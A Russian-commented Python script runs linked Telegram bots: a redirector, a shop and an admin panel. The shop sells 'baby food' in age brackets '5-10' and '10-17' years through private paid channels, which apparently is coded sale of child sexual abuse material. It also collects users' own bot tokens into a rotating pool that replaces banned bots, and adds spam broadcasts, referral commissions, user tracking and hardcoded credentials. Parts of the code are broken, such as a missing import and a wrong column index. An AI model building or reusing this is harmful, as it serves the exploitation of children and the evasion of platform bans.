# telegram_twin_bot_system.py
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import time
import threading
import requests
import random
import string

# ========== КОНФИГУРАЦИЯ ==========
MAIN_BOT_TOKEN = "8919013227:AAE_63ez-hd17qEdq5po_k7N2CclzHicY0w"
WORKER_BOT_TOKEN = "8913951478:AAGpBtNbN7pa9Gqk9_inuaJIOgfTqbccmz0"
LOGGER_BOT_TOKEN = "8902065807:AAHk0oPacGI1A6RYoV_2Tr9x_Pcm5VOtv54"

REVIEWS_CHANNEL = "https://t.me/+7bOC6qtTw2s3NjBh"
SUBSCRIBE_CHANNEL = "https://t.me/+XvIHw0ai77ViZjdh"
ADMIN_ID = "8919013227"

# Фото (замени на реальные ссылки или file_id)
# Для получения file_id отправь фото в бота @getfileidbot
PHOTO_PRODUCT_5_10 = "AgACAgIAAxkBAAIB"  # file_id фото 5-10 лет
PHOTO_PRODUCT_10_17 = "AgACAgIAAxkBAAIC"  # file_id фото 10-17 лет

# ========== БАЗА ДАННЫХ ==========
conn = sqlite3.connect('twin_bot.db', check_same_thread=False)
c = conn.cursor()

c.execute('''CREATE TABLE IF NOT EXISTS worker_bots 
             (token TEXT PRIMARY KEY, username TEXT, added_by TEXT, timestamp INTEGER, is_active INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS current_worker 
             (id INTEGER PRIMARY KEY, token TEXT, username TEXT, updated_at INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS payments 
             (user_id TEXT, amount INTEGER, category TEXT, timestamp INTEGER, ref_id TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_sessions 
             (user_id TEXT, temp_token TEXT, step TEXT, timestamp INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_stats 
             (user_id TEXT, purchases INTEGER, tokens_submitted INTEGER, last_active INTEGER, ref_link TEXT, ref_owner TEXT, earned INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS referals 
             (ref_id TEXT PRIMARY KEY, owner_id TEXT, earnings INTEGER, clicks INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS all_users 
             (user_id TEXT PRIMARY KEY, first_seen INTEGER, last_seen INTEGER, subscribed INTEGER)''')
c.execute('''CREATE TABLE IF NOT EXISTS user_logs 
             (user_id TEXT, action TEXT, details TEXT, timestamp INTEGER)''')
conn.commit()

# ========== ФУНКЦИИ ==========
def log_to_logger(message_text):
    try:
        url = f"https://api.telegram.org/bot{LOGGER_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_ID, "text": message_text[:4000], "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=3)
    except:
        pass

def log_action(user_id, action, details=""):
    c.execute("INSERT INTO user_logs VALUES (?, ?, ?, ?)", (user_id, action, details, int(time.time())))
    conn.commit()
    log_to_logger(f"📋 {action}: {details[:100]}")

def register_user(user_id, ref_id=None):
    c.execute("SELECT * FROM all_users WHERE user_id=?", (user_id,))
    if not c.fetchone():
        c.execute("INSERT INTO all_users VALUES (?, ?, ?, 0)", (user_id, int(time.time()), int(time.time())))
        # Обработка реферала
        if ref_id and ref_id != user_id:
            c.execute("UPDATE referals SET clicks = clicks + 1 WHERE ref_id=?", (ref_id,))
            c.execute("INSERT OR IGNORE INTO user_stats (user_id, purchases, tokens_submitted, last_active, ref_owner, earned) VALUES (?, 0, 0, ?, ?, 0)",
                      (user_id, int(time.time()), ref_id))
            log_to_logger(f"🔗 РЕФЕРАЛ: {ref_id} -> {user_id}")
    c.execute("UPDATE all_users SET last_seen=? WHERE user_id=?", (int(time.time()), user_id))
    conn.commit()

def generate_ref_link(user_id):
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    c.execute("INSERT OR REPLACE INTO user_stats (user_id, purchases, tokens_submitted, last_active, ref_link, ref_owner, earned) VALUES (?, COALESCE((SELECT purchases FROM user_stats WHERE user_id=?), 0), COALESCE((SELECT tokens_submitted FROM user_stats WHERE user_id=?), 0), ?, ?, ?, COALESCE((SELECT earned FROM user_stats WHERE user_id=?), 0))",
              (user_id, user_id, user_id, int(time.time()), code, user_id, user_id))
    c.execute("INSERT OR IGNORE INTO referals (ref_id, owner_id, earnings, clicks) VALUES (?, ?, 0, 0)", (code, user_id))
    conn.commit()
    return f"https://t.me/{WORKER_BOT_TOKEN.split(':')[0]}?start=ref_{code}"

def add_earnings(ref_code, amount):
    c.execute("SELECT owner_id FROM referals WHERE ref_id=?", (ref_code,))
    row = c.fetchone()
    if row:
        owner = row[0]
        commission = int(amount * 0.4)
        c.execute("UPDATE referals SET earnings = earnings + ? WHERE ref_id=?", (commission, ref_code))
        c.execute("UPDATE user_stats SET earned = earned + ? WHERE user_id=?", (commission, owner))
        conn.commit()
        log_to_logger(f"💰 КОМИССИЯ 40%: {commission}₽ для {owner} по рефке {ref_code}")

def get_current_worker():
    c.execute("SELECT token, username FROM current_worker WHERE id=1")
    row = c.fetchone()
    if row:
        return row[0], row[1]
    return WORKER_BOT_TOKEN, "worker_bot"

def set_current_worker(token, username):
    c.execute("DELETE FROM current_worker WHERE id=1")
    c.execute("INSERT INTO current_worker VALUES (1, ?, ?, ?)", (token, username, int(time.time())))
    conn.commit()

def check_bot_alive(token):
    try:
        r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5)
        if r.json().get('ok'):
            return True, r.json()['result']['username']
        return False, None
    except:
        return False, None

def add_worker_bot(token, username, added_by):
    c.execute("INSERT OR REPLACE INTO worker_bots VALUES (?, ?, ?, ?, 1)", (token, username, added_by, int(time.time())))
    conn.commit()

def get_all_worker_bots():
    c.execute("SELECT token, username, added_by, timestamp FROM worker_bots WHERE is_active=1 ORDER BY timestamp DESC")
    return c.fetchall()

def rotate_worker():
    current_token, current_name = get_current_worker()
    alive, _ = check_bot_alive(current_token)
    if not alive:
        for token, username, _, _ in get_all_worker_bots():
            if token != current_token and check_bot_alive(token)[0]:
                set_current_worker(token, username)
                log_to_logger(f"🔄 РОТАЦИЯ: @{username}")
                return True
        set_current_worker(WORKER_BOT_TOKEN, "worker_bot_default")
    return True

def monitor_worker_health():
    while True:
        try:
            rotate_worker()
        except:
            pass
        time.sleep(600)

def ask_subscribe(user_id, chat_id, message_id):
    time.sleep(60)
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("📢 ПОДПИСАТЬСЯ", url=SUBSCRIBE_CHANNEL))
    kb.add(InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="sub_checked"))
    try:
        worker_bot.send_message(chat_id, "🔔 <b>ЧТОБЫ ВСЕГДА ИМЕТЬ ДОСТУП К БОТУ</b>\n\nПодпишись на наш канал:", parse_mode='HTML', reply_markup=kb)
    except:
        pass

# ========== БОТ-ЛОГГЕР (АДМИНКА) ==========
logger_bot = telebot.TeleBot(LOGGER_BOT_TOKEN)

def admin_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="admin_stats"),
        InlineKeyboardButton("🤖 БОТЫ", callback_data="admin_bots"),
        InlineKeyboardButton("📜 ЛОГИ", callback_data="admin_logs"),
        InlineKeyboardButton("📢 РАССЫЛКА", callback_data="admin_spam"),
        InlineKeyboardButton("➕ ДОБАВИТЬ БОТА", callback_data="admin_add_bot"),
        InlineKeyboardButton("📈 РЕФЕРАЛЫ", callback_data="admin_refs")
    )
    return kb

@logger_bot.message_handler(commands=['start', 'admin'])
def logger_start(message):
    if str(message.from_user.id) != ADMIN_ID:
        logger_bot.reply_to(message, "❌ ДОСТУП ЗАПРЕЩЁН")
        return
    logger_bot.send_message(message.chat.id, "🔐 <b>АДМИН ПАНЕЛЬ</b>", parse_mode='HTML', reply_markup=admin_keyboard())

@logger_bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback(call):
    if str(call.from_user.id) != ADMIN_ID:
        logger_bot.answer_callback_query(call.id, "Доступ запрещён")
        return
    
    if call.data == "admin_stats":
        c.execute("SELECT COUNT(*) FROM payments")
        payments = c.fetchone()[0]
        c.execute("SELECT COUNT(DISTINCT user_id) FROM payments")
        buyers = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM worker_bots WHERE is_active=1")
        bots = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM all_users")
        users = c.fetchone()[0]
        c.execute("SELECT SUM(amount) FROM payments")
        total = c.fetchone()[0] or 0
        c.execute("SELECT SUM(earnings) FROM referals")
        ref_earn = c.fetchone()[0] or 0
        text = f"📊 СТАТИСТИКА\n\nОплат: {payments}\nПокупателей: {buyers}\nБотов: {bots}\nЮзеров: {users}\nСумма: {total}₽\nРеф. выплачено: {ref_earn}₽"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_keyboard())
    
    elif call.data == "admin_bots":
        bots = get_all_worker_bots()
        if not bots:
            text = "Нет ботов"
        else:
            text = "🤖 БОТЫ:\n\n"
            for token, username, added_by, ts in bots[:10]:
                alive, _ = check_bot_alive(token)
                text += f"@{username} — {'✅' if alive else '❌'}\nДобавил: {added_by}\nТокен: {token[:20]}...\n\n"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_keyboard())
    
    elif call.data == "admin_logs":
        c.execute("SELECT action, details, timestamp FROM user_logs ORDER BY timestamp DESC LIMIT 15")
        logs = c.fetchall()
        if not logs:
            text = "Логов нет"
        else:
            text = "📜 ПОСЛЕДНИЕ ЛОГИ:\n\n"
            for action, details, ts in logs:
                dt = datetime.fromtimestamp(ts).strftime("%H:%M %d.%m")
                text += f"[{dt}] {action}: {details[:50]}\n"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_keyboard())
    
    elif call.data == "admin_spam":
        logger_bot.send_message(call.message.chat.id, "📢 ВВЕДИ ТЕКСТ ДЛЯ РАССЫЛКИ (HTML):")
        c.execute("INSERT OR REPLACE INTO user_sessions VALUES (?, ?, ?, ?)", (ADMIN_ID, "", "spam_mode", int(time.time())))
        conn.commit()
        logger_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "admin_add_bot":
        logger_bot.send_message(call.message.chat.id, "➕ ОТПРАВЬ ТОКЕН БОТА:")
        c.execute("INSERT OR REPLACE INTO user_sessions VALUES (?, ?, ?, ?)", (ADMIN_ID, "", "add_bot_mode", int(time.time())))
        conn.commit()
        logger_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "admin_refs":
        c.execute("SELECT ref_id, owner_id, earnings, clicks FROM referals ORDER BY earnings DESC LIMIT 10")
        refs = c.fetchall()
        if not refs:
            text = "Нет рефералов"
        else:
            text = "📈 ТОП РЕФЕРАЛОВ:\n\n"
            for ref_id, owner, earn, clicks in refs:
                text += f"Код: {ref_id}\nВладелец: {owner}\nЗаработал: {earn}₽\nКликов: {clicks}\n\n"
        logger_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=admin_keyboard())

@logger_bot.message_handler(func=lambda m: True)
def logger_text(m):
    if str(m.from_user.id) != ADMIN_ID:
        return
    c.execute("SELECT step FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
    row = c.fetchone()
    if not row:
        return
    step = row[0]
    if step == "spam_mode":
        c.execute("SELECT user_id FROM all_users")
        users = c.fetchall()
        sent = 0
        for (uid,) in users:
            try:
                logger_bot.send_message(uid, m.text, parse_mode='HTML')
                sent += 1
                time.sleep(0.05)
            except:
                pass
        logger_bot.reply_to(m, f"✅ РАССЫЛКА ЗАВЕРШЕНА. ОТПРАВЛЕНО: {sent}")
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
        conn.commit()
    elif step == "add_bot_mode":
        token = m.text.strip()
        if ':' not in token:
            logger_bot.reply_to(m, "❌ НЕВЕРНЫЙ ФОРМАТ")
            return
        alive, username = check_bot_alive(token)
        if not alive:
            logger_bot.reply_to(m, "❌ БОТ НЕ СУЩЕСТВУЕТ")
            return
        add_worker_bot(token, username, ADMIN_ID)
        logger_bot.reply_to(m, f"✅ БОТ @{username} ДОБАВЛЕН")
        c.execute("DELETE FROM user_sessions WHERE user_id=?", (ADMIN_ID,))
        conn.commit()

# ========== ОСНОВНОЙ БОТ (ПЕРЕХОДНИК) ==========
main_bot = telebot.TeleBot(MAIN_BOT_TOKEN)

@main_bot.message_handler(commands=['start'])
def main_start(m):
    user_id = str(m.from_user.id)
    register_user(user_id)
    token, username = get_current_worker()
    alive, _ = check_bot_alive(token)
    if not alive:
        rotate_worker()
        token, username = get_current_worker()
    # Специальная ссылка-приглашение (t.me/бот?start=...)
    invite_link = f"https://t.me/{username}?start=ref_{user_id}"
    text = f"🤖 <b>АКТУАЛЬНЫЙ БОТ</b>\n\n👉 <a href='https://t.me/{username}'>{username}</a>\n\n📎 <b>ТВОЯ РЕФЕРАЛЬНАЯ ССЫЛКА:</b>\n<code>{invite_link}</code>\n\nПо ней могут зайти любые пользователи"
    main_bot.reply_to(m, text, parse_mode='HTML', disable_web_page_preview=True)
    log_action(user_id, "ЗАПУСК ОСНОВНОГО", f"бот: @{username}")

# ========== РАБОЧИЙ БОТ (ПРОДАЖИ) ==========
worker_bot = telebot.TeleBot(WORKER_BOT_TOKEN)

def worker_menu():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🛒 МАГАЗИН", callback_data="shop"),
        InlineKeyboardButton("🍼 БЕСПЛАТНОЕ ПИТАНИЕ", callback_data="free"),
        InlineKeyboardButton("⭐ ОТЗЫВЫ", callback_data="reviews"),
        InlineKeyboardButton("📈 РЕФЕРАЛЬНАЯ ССЫЛКА", callback_data="my_ref"),
        InlineKeyboardButton("🎲 БРОСИТЬ КУБИК", callback_data="dice")
    )
    return kb

@worker_bot.message_handler(commands=['start'])
def worker_start(m):
    user_id = str(m.from_user.id)
    ref_id = None
    if ' ' in m.text:
        ref_id = m.text.split()[1].replace('ref_', '')
    register_user(user_id, ref_id)
    
    # Генерация рефссылки если нет
    c.execute("SELECT ref_link FROM user_stats WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row or not row[0]:
        generate_ref_link(user_id)
    
    worker_bot.send_message(m.chat.id, "🍼 <b>ДЕТСКОЕ ПИТАНИЕ SHOP</b>\n\nВыбери действие:", parse_mode='HTML', reply_markup=worker_menu())
    log_action(user_id, "ЗАПУСК РАБОЧЕГО", f"реф: {ref_id}")
    
    # Запуск проверки подписки через минуту
    threading.Thread(target=ask_subscribe, args=(user_id, m.chat.id, m.message_id), daemon=True).start()

@worker_bot.callback_query_handler(func=lambda call: True)
def worker_cb(call):
    user_id = str(call.from_user.id)
    
    if call.data == "reviews":
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("⭐ КАНАЛ С ОТЗЫВАМИ", url=REVIEWS_CHANNEL))
        kb.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back"))
        worker_bot.edit_message_text("⭐ <b>ОТЗЫВЫ НАШИХ КЛИЕНТОВ</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "shop":
        kb = InlineKeyboardMarkup(row_width=1)
        kb.add(
            InlineKeyboardButton("👶 5-10 ЛЕТ", callback_data="buy_5_10"),
            InlineKeyboardButton("🧒 10-17 ЛЕТ", callback_data="buy_10_17"),
            InlineKeyboardButton("🔙 НАЗАД", callback_data="back")
        )
        worker_bot.edit_message_text("📦 <b>ВЫБЕРИ КАТЕГОРИЮ</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "buy_5_10":
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("💳 ОПЛАТИТЬ", url="https://t.me/+KIYBiERHtzMzZmVi"))
        kb.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="shop"))
        # Фото товара (без цены и порций)
        try:
            worker_bot.edit_message_media(
                InputMediaPhoto(PHOTO_PRODUCT_5_10, caption="👶 <b>ДЕТСКОЕ ПИТАНИЕ 5-10 ЛЕТ</b>\n\nПосле оплаты доступ откроется автоматически"),
                call.message.chat.id, call.message.message_id, reply_markup=kb, parse_mode='HTML'
            )
        except:
            worker_bot.edit_message_text("👶 5-10 ЛЕТ\n\nПосле оплаты доступ откроется", call.message.chat.id, call.message.message_id, reply_markup=kb)
        log_action(user_id, "ОПЛАТА 5-10", "инициация")
    
    elif call.data == "buy_10_17":
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("💳 ОПЛАТИТЬ", url="https://t.me/+JgSRSMJp6ww4MzUy"))
        kb.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="shop"))
        try:
            worker_bot.edit_message_media(
                InputMediaPhoto(PHOTO_PRODUCT_10_17, caption="🧒 <b>ДЕТСКОЕ ПИТАНИЕ 10-17 ЛЕТ</b>\n\nПосле оплаты доступ откроется автоматически"),
                call.message.chat.id, call.message.message_id, reply_markup=kb, parse_mode='HTML'
            )
        except:
            worker_bot.edit_message_text("🧒 10-17 ЛЕТ\n\nПосле оплаты доступ откроется", call.message.chat.id, call.message.message_id, reply_markup=kb)
        log_action(user_id, "ОПЛАТА 10-17", "инициация")
    
    elif call.data == "free":
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🤖 СОЗДАТЬ БОТА", url="https://t.me/botfather"))
        kb.add(InlineKeyboardButton("📤 ОТПРАВИТЬ ТОКЕН", callback_data="send_token"))
        kb.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back"))
        worker_bot.edit_message_text("🍼 <b>БЕСПЛАТНОЕ ПИТАНИЕ</b>\n\n1. Создай бота в @BotFather\n2. Отправь токен\n3. Получи ссылку на канал", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "send_token":
        worker_bot.send_message(call.message.chat.id, "📝 ОТПРАВЬ ТОКЕН СВОЕГО БОТА:")
        c.execute("INSERT OR REPLACE INTO user_sessions VALUES (?, ?, ?, ?)", (user_id, "", "awaiting_token", int(time.time())))
        conn.commit()
        worker_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "my_ref":
        c.execute("SELECT ref_link FROM user_stats WHERE user_id=?", (user_id,))
        row = c.fetchone()
        if not row or not row[0]:
            link = generate_ref_link(user_id)
        else:
            link = row[0]
        c.execute("SELECT earnings FROM user_stats WHERE user_id=?", (user_id,))
        earn_row = c.fetchone()
        earnings = earn_row[1] if earn_row else 0
        text = f"📈 <b>ТВОЯ РЕФЕРАЛЬНАЯ ССЫЛКА</b>\n\n<code>https://t.me/{WORKER_BOT_TOKEN.split(':')[0]}?start=ref_{user_id}</code>\n\n💰 ЗАРАБОТАНО: {earnings}₽\n👥 40% с каждой продажи твоих рефералов"
        kb = InlineKeyboardMarkup()
        kb.add(InlineKeyboardButton("🔙 НАЗАД", callback_data="back"))
        worker_bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=kb)
    
    elif call.data == "dice":
        dice = random.randint(1, 6)
        worker_bot.send_dice(call.message.chat.id)
        log_action(user_id, "БРОСОК КУБИКА", f"значение: {dice}")
    
    elif call.data == "sub_checked":
        worker_bot.answer_callback_query(call.id, "✅ СПАСИБО!")
        c.execute("UPDATE all_users SET subscribed=1 WHERE user_id=?", (user_id,))
        conn.commit()
        worker_bot.delete_message(call.message.chat.id, call.message.message_id)
    
    elif call.data == "back":
        worker_bot.edit_message_text("🍼 <b>ДЕТСКОЕ ПИТАНИЕ SHOP</b>\n\nВыбери действие:", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=worker_menu())

@worker_bot.message_handler(func=lambda m: True)
def worker_token_handler(m):
    user_id = str(m.from_user.id)
    c.execute("SELECT step FROM user_sessions WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row or row[0] != "awaiting_token":
        return
    token = m.text.strip()
    if ':' not in token:
        worker_bot.reply_to(m, "❌ НЕВЕРНЫЙ ФОРМАТ ТОКЕНА")
        return
    alive, username = check_bot_alive(token)
    if not alive:
        worker_bot.reply_to(m, "❌ БОТ НЕ СУЩЕСТВУЕТ ИЛИ ЗАБЛОКИРОВАН")
        return
    add_worker_bot(token, username, user_id)
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🍼 ПОЛУЧИТЬ", url="https://t.me/+fEQI916fF2ZkNDMx"))
    worker_bot.send_message(m.chat.id, f"✅ ТОКЕН ПРИНЯТ! БОТ @{username} ДОБАВЛЕН В БАЗУ.\n\nДЕРЖИ ССЫЛКУ НА БЕСПЛАТНЫЙ ДОСТУП:", reply_markup=kb)
    c.execute("DELETE FROM user_sessions WHERE user_id=?", (user_id,))
    conn.commit()
    log_action(user_id, "СДАН ТОКЕН", f"бот: @{username}")

# ========== ЗАПУСК ==========
def run_bot(bot_instance, name):
    while True:
        try:
            print(f"✅ {name} ЗАПУЩЕН")
            bot_instance.polling(none_stop=True, interval=3, timeout=30)
        except Exception as e:
            print(f"❌ {name}: {e}")
            time.sleep(5)

if __name__ == "__main__":
    from datetime import datetime
    add_worker_bot(WORKER_BOT_TOKEN, "worker_bot", "system")
    set_current_worker(WORKER_BOT_TOKEN, "worker_bot")
    
    threading.Thread(target=monitor_worker_health, daemon=True).start()
    threading.Thread(target=run_bot, args=(main_bot, "ОСНОВНОЙ"), daemon=True).start()
    threading.Thread(target=run_bot, args=(worker_bot, "РАБОЧИЙ"), daemon=True).start()
    threading.Thread(target=run_bot, args=(logger_bot, "ЛОГГЕР"), daemon=True).start()
    
    log_to_logger("🚀 ВСЕ БОТЫ ЗАПУЩЕНЫ")
    print("✅ ВСЕ БОТЫ РАБОТАЮТ")
    
    while True:
        time.sleep(1)